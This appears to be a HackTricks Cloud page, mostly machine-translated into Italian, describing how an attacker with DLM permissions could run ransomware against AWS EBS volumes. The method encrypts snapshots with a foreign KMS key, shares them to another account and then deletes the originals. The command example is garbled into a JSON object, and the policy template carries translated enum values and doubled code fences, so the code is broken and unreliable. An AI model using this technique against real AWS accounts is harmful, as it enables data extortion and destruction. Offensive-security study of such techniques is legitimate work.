# AWS - Gestore del ciclo di vita dei dati

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team di HackTricks AWS)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

## Gestore del ciclo di vita dei dati (DLM)

### `EC2:DescribeVolumes`, `DLM:CreateLifeCyclePolicy`

Un attacco ransomware pu√≤ essere eseguito crittografando il maggior numero possibile di volumi EBS e quindi cancellando le istanze EC2 attuali, i volumi EBS e gli snapshot. Per automatizzare questa attivit√† dannosa, si pu√≤ utilizzare Amazon DLM, crittografando gli snapshot con una chiave KMS da un altro account AWS e trasferendo gli snapshot crittografati a un account diverso. In alternativa, potrebbero trasferire gli snapshot senza crittografia a un account gestito da loro e crittografarli l√¨. Anche se non √® immediato crittografare direttamente i volumi EBS o gli snapshot esistenti, √® possibile farlo creando un nuovo volume o snapshot.

In primo luogo, si utilizzer√† un comando per raccogliere informazioni sui volumi, come l'ID dell'istanza, l'ID del volume, lo stato della crittografia, lo stato dell'attaccamento e il tipo di volume.
```aws ec2 describe-volumes```

Secondly, one will create the lifecycle policy. This command employs the DLM API to set up a lifecycle policy that automatically takes daily snapshots of specified volumes at a designated time. It also applies specific tags to the snapshots and copies tags from the volumes to the snapshots. The policyDetails.json file includes the lifecycle policy's specifics, such as target tags, schedule, the ARN of the optional KMS key for encryption, and the target account for snapshot sharing, which will be recorded in the victim's CloudTrail logs.


```bash
```json
{
  "aws dlm create-lifecycle-policy --description": "La mia prima policy",
  "--state": "ABILITATO",
  "--execution-role-arn": "arn:aws:iam::12345678910:role/AWSDataLifecycleManagerDefaultRole",
  "--policy-details": "file://policyDetails.json"
}
```
```

A template for the policy document can be seen here:
```bash
```json
{
"PolicyType": "GESTIONE_SNAPSHOT_EBS",
"ResourceTypes": [
"VOLUME"
],
"TargetTags": [
{
"Key": "ChiaveEsempio",
"Value": "ValoreEsempio"
}
],
"Schedules": [
{
"Name": "SnapshotGiornalieri",
"CopyTags": true,
"TagsToAdd": [
{
"Key": "CreatoreSnapshot",
"Value": "DLM"
}
],
"VariableTags": [
{
"Key": "CentroCosti",
"Value": "Finanza"
}
],
"CreateRule": {
"Interval": 24,
"IntervalUnit": "ORE",
"Times": [
"03:00"
]
},
"RetainRule": {
"Count": 14
},
"FastRestoreRule": {
"Count": 2,
"Interval": 12,
"IntervalUnit": "ORE"
},
"CrossRegionCopyRules": [
{
"TargetRegion": "us-west-2",
"Encrypted": true,
"CmkArn": "arn:aws:kms:us-west-2:123456789012:key/your-kms-key-id",
"CopyTags": true,
"RetainRule": {
"Interval": 1,
"IntervalUnit": "GIORNI"
}
}
],
"ShareRules": [
{
"TargetAccounts": [
"123456789012"
],
"UnshareInterval": 30,
"UnshareIntervalUnit": "GIORNI"
}
]
}
],
"Parameters": {
"ExcludeBootVolume": false
}
}
```
```

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
